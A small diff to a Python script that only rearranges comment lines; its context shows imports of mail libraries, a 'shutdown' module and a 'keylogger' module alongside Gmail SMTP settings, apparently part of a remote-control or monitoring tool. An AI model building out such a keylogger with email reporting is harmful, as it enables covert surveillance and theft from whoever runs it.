@@ -1,3 +1,6 @@
+#-------------------------------------------------------------------------------------------------
+#THINGS WILL BE USED
+
 import smtplib
 import imaplib
 import email
@@ -11,7 +14,6 @@ import shutdown
 from process_app import *
 from keylogger import *
 
-#-------------------------------------------------------------------------------------------------
 smtp_server = 'smtp.gmail.com'  # SMTP server for Gmail
 smtp_port = 587  # Port for TLS
 
